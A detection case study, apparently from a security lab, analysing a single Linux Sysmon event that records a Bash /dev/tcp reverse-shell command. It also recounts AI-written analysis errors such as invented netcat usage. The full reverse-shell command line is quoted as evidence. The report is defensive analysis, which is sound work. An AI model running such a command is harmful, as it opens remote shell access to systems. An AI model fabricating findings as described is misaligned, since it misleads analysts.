# LT-03 — Linux Bash Reverse-Shell Command: Verified Case Study

## Assessment

**Suspicious / high-confidence reverse-shell command pattern observed**, supported by Linux-Sysmon Process Creation [E001]. **TCP connection and interactive shell outcomes are unknown.** This is a **single-unique-event** detection test, not a multi-source incident reconstruction. The targeted `10.0.255.12:4444` is obtained **from CommandLine**, not a captured network session. `10.0.255.12` is an RFC1918 private address; calling it a public Internet-routable IP is incorrect.

## Observed Source Evidence

- Provider: `Linux-Sysmon`; Event ID `1` (Process Creation); EventRecordID `905`.
- Exact source timestamp (UTC): `2024-05-31T18:01:42.639983000Z`.
- Host: `ip-10-0-255-92`; recorded user: `root` (not evidence of privilege escalation).
- Image: `/usr/bin/bash`; parent image: `/usr/bin/dash`.
- PID: `9414`; parent PID: `9413`.
- ProcessGuid: `{ec227f46-1086-665a-0dcf-bdc908560000}`.
- Source CommandLine (recorded text; **do not execute**):

```text
bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53
```

- Two source XML lines (`1`, `2`) are **byte-for-byte identical text records** including EventRecordID and ProcessGuid. They are represented by **one unique normalized event [E001]**; this is not evidence of two distinct executions.
- No Sysmon Event ID 3 network events were available in this 2-record sample. Absence of such a record here cannot rule out network activity outside the sample.

## Chain of Custody / Verified Links

- Original: `LT-03-Sysmon-original.log` — SHA-256 `9f2fe9e8c2f3e00dc0cadbdba38c3fa791be1dfc026ca8e236682ed1916d8acf`.
- Focus: `LT-03-focused.json` — SHA-256 `bca6074cb5656d1c835c3637323efc91979045d4d7de59abc44c909d9f343088`.
- Evidence mapping: `LT-03-evidence-mapping.csv` — SHA-256 `4b93121c340295a22dce7fa3f8b032f35e41f7907bfaabef17f5f0557a8621a8`.
- `E001` maps to original lines `1` and `2`; both raw line hashes, process identifiers, EventRecordID, timestamp, and command-derived endpoint were verified against the XML.
- Full source-derived timeline: `LT-03-Verified-Timeline.csv` (one row, not two).

## AI Analysis and Analyst Corrections

- Initial analysis `AN-20261018-231218-e901`: automated validator reported **0** flags. Human analyst identified **invented netcat usage**, incorrect public/external IP implication, and imprecise source attribution. These are deficiencies in the generated narrative, not evidence of netcat execution.
- The upgraded validator's **read-only replay** raised **four review flags** for the two categories of error repeated in report sections. The source data and old AI result were not altered.
- Post-upgrade analysis `AN-20261018-234042-ec78`: the repeated netcat and IP-scope claims were avoided, but the model remained insufficiently explicit about the Bash `/dev/tcp` reverse-shell pattern, source attribution, and duplicate evidence context.
- CLI-observed analyst disposition: **Corrected**. **This script does not independently verify the application's review-storage schema.**
- Automated flags assess validation rules; **0 flags does not prove a correct analysis**.

## Recommended Follow-up

1. Correlate `[E001]` ProcessGuid and PID with network/socket telemetry, firewall flows, and the destination-side logs, if available.
2. Determine whether a connection to `10.0.255.12:4444` was attempted at the network layer or established; investigate any follow-on shell activity.
3. Determine authorization and test-lab context before making attribution or containment recommendations.
4. Use deterministic detection for known `/dev/tcp` reverse-shell patterns, while separating **observed command** from **connection outcome**.

## Conclusion

Source-supported assessment: **suspicious Bash reverse-shell command pattern** [E001]; one observed unique Process Creation record; **network success, interactive access, malicious intent, and privilege escalation remain unconfirmed**. Original files, AI outputs, and human-review records are preserved.
